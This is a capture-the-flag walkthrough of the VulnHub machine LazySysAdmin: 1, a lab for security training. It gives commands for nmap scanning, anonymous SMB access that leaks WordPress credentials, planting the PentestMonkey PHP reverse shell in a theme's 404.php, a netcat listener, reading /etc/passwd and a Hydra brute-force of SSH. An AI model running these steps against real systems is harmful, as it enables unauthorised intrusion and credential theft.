# LazySysAdmin: 1

- **Machine:** LazySysAdmin: 1
- **Download:** http://vulnhub.com/entry/lazysysadmin-1,205/

![](797-1.png)

---

# Setup

1. Extract the downloaded archive.
2. Import the `.ovf` file into VirtualBox.
3. Click **Finish**.
4. Start the virtual machine.

---

# Network Scanning

## Discover the Target IP

```bash
nmap -sn 192.168.2.0/24
```

![](797-2.png)

---

## Full Nmap Scan

Perform a complete scan to enumerate all ports, services, operating system details, and NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.227
```

![](797-3.png)

---

## Optional Port Scan

```bash
nmap -v -p- 192.168.2.166
```

```bash
nmap -sC -sV -A 192.168.2.166
```

---

## HTTP Enumeration

Run the `http-enum` NSE script to discover hidden web resources.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.166
```

![](797-4.png)

---

# SMB Enumeration

List the available SMB shares.

```bash
smbclient -L //192.168.2.166 -N
```

![](797-5.png)

Connect to the discovered share.

```bash
smbclient //192.168.2.166/share$ -N
```

![](797-6.png)

Download the interesting files.

```bash
get deets.txt /home/anish/Documents/Vulnhub/deets.txt
```

```bash
get robots.txt /home/anish/Documents/Vulnhub/robots.txt
```

```bash
get todolist.txt /home/anish/Documents/Vulnhub/todolist.txt
```

![](797-7.png)

![](797-8.png)

Navigate to the WordPress directory.

```bash
cd wordpress
```

![](797-9.png)

Download the WordPress configuration file.

```bash
get wp-config.php /home/anish/Documents/Vulnhub/wp-config.php
```

Read the configuration file.

```bash
cat wp-config.php
```

![](797-10.png)

Database credentials are exposed.

```text
Username : Admin
Password : TogieMYSQL12345^^
```

---

# Web Enumeration

Visit the following endpoints.

- http://192.168.2.166
- http://192.168.2.166/wordpress/
- http://192.168.2.166/test/
- http://192.168.2.166/robots.txt
- http://192.168.2.166/info.php
- http://192.168.2.166/phpmyadmin/
- http://192.168.2.166/wordpress/wp-login.php
- http://192.168.2.166/apache/
- http://192.168.2.166/old/

Enumerate WordPress users.

```bash
wpscan --url http://192.168.2.166/wordpress -e u
```

![](797-11.png)

Login to the WordPress admin panel.

- http://192.168.2.166/wordpress/wp-login.php

```text
Username : Admin
Password : TogieMYSQL12345^^
```

![](797-12.png)

Successfully logged into the WordPress dashboard.

---

# Reverse Shell

Navigate to:

```text
Appearance → Editor → Twenty Fifteen → 404.php
```

![](797-13.png)

Replace the existing PHP code with the **PentestMonkey PHP Reverse Shell**.

> **Note:** Update the attacker's IP address and listening port before uploading the payload.

Start a Netcat listener.

```bash
nc -nlvp 443
```

Trigger the modified theme file.

```text
http://192.168.2.166/wordpress/wp-content/themes/twentyfifteen/404.php
```

A reverse shell is successfully established.

![](797-14.png)

---

# SSH Access

Enumerate the local users.

```bash
cat /etc/passwd
```

![](797-15.png)

A normal user named **togie** is identified.

Brute-force the SSH password.

```bash
hydra -l togie -P /opt/rockyou.txt ssh://192.168.2.166
```

![](797-16.png)

Recovered credentials:

```text
Username : togie
Password : 12345
```

Login via SSH.

```bash
ssh togie@192.168.2.166
```

![](797-17.png)

SSH access is successfully obtained.

---

# Key Learning

- SMB shares may expose sensitive configuration files.
- WordPress configuration files often contain database credentials.
- Weak administrator passwords can lead to complete CMS compromise.
- Editing WordPress theme files is a common method for achieving code execution after authentication.
- Always enumerate local users after obtaining a shell.
- Weak SSH passwords can provide a more stable shell than a reverse shell.

---

# Summary

The assessment began by enumerating SMB shares, where the exposed **WordPress configuration file** revealed administrator credentials. These credentials allowed successful authentication to the WordPress admin dashboard. By modifying the **Twenty Fifteen** theme's `404.php` file with a PHP reverse shell, remote code execution was achieved. After gaining shell access, local user enumeration identified the **togie** account. A weak SSH password was discovered through brute force, providing stable SSH access to the target system.